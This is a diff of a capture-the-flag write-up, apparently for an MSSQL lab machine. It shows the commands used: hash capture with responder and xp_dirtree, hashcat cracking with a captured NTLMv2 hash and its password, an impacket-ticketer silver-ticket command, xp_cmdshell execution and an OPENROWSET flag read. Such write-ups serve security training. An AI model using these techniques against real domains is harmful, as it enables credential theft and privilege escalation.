@@ -27,7 +27,7 @@ created: 2025-10-16
 - Assumed breach as database user `scott`:`Sm230#C5NatH`
 - `MSSQL`
 - Generate `NTLM` hash from password using `iconv` and `openssl md4`
-- Silver ticket attack (when we have a service account's `NTLM` hash or can create it from the password, think silver ticket)
+- Silver ticket attack
 - Create silver ticket with the Domain Admins group and leverage the function `OPENROWSET` to retrieve flag contents. This function reads file contents with the permissions of the silver ticket
 
 **🛠️ Tools:**  
@@ -48,7 +48,6 @@ created: 2025-10-16
 ## 🌐 Port Scan
 
 - **TCP**: 1433
-- **UDP**: None
 
 ---
 
@@ -58,7 +57,7 @@ We have only one open port, which is for `MSSQL`. The box is from an assumed bre
 
 - `scott`:`Sm230#C5NatH`
 
-This was a database user, as I had to use `--windows-auth` on `NetExec` for it to work on the `MSSQL` service. I enumerated users, databases, and links, but there was nothing useful. I resorted to stealing the `NTLMv2` hash of the user account running the `MSSQL` server with `responder` and `xp_dirtree`.
+This was a database user, so I had to use `--windows-auth` on `NetExec` for it to work on the `MSSQL` service. I enumerated users, databases, and links, but there was nothing useful. I resorted to stealing the `NTLMv2` hash of the user account running the `MSSQL` server with `responder` and `xp_dirtree`.
 
 ```shell
 sudo responder -I tun0
@@ -83,7 +82,7 @@ And we get this in `responder`:
 This captured the domain user `mssqlsvc`'s `NTLMv2` hash, which I tried to crack.
 
 ```shell
-.\hashcat.exe -a 0 .\hashes.txt .\rockyou.txt -r .\rules\best66.rule -O -w 4
+hashcat hashes.txt $ROCKYOU -r /usr/share/hashcat/rules/best66.rule
 
 MSSQLSVC::SIGNED:84d79d8774742d71:bb417a1a09bcbcd5a990d87b9dbdfe0e:010100000000000000fd2b872a3ddc01e22ad5fde3a547e8000000000200080038004f004700500001001e00570049004e002d004f00490030004800420043005900330058005200410004003400570049004e002d004f0049003000480042004300590033005800520041002e0038004f00470050002e004c004f00430041004c000300140038004f00470050002e004c004f00430041004c000500140038004f00470050002e004c004f00430041004c000700080000fd2b872a3ddc0106000400020000000800300030000000000000000000000000300000c2b817de932374a55eab0351e681e01e63f2ebb5d0251c1ea538ae1821e0cf850a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0037000000000000000000:purPLE9795!@
 ```
@@ -174,7 +173,7 @@ SQL (SIGNED\Administrator  dbo@master)> select is_srvrolemember('sysadmin')
 1
 ```
 
->[!tip]
+>[!note]
 >Without the `-groups <RID>` parameter, we don't get `sysadmin`.
 
 This means we can execute `xp_cmdshell` to gain remote code execution.
@@ -281,7 +280,7 @@ impacket-ticketer -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-
 >[!error]
 >Without the user `ID`, it doesn't work.
 
-So I managed to get the root flag like this:
+I managed to get the root flag like this:
 
 ```shell
 SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS DataFile;
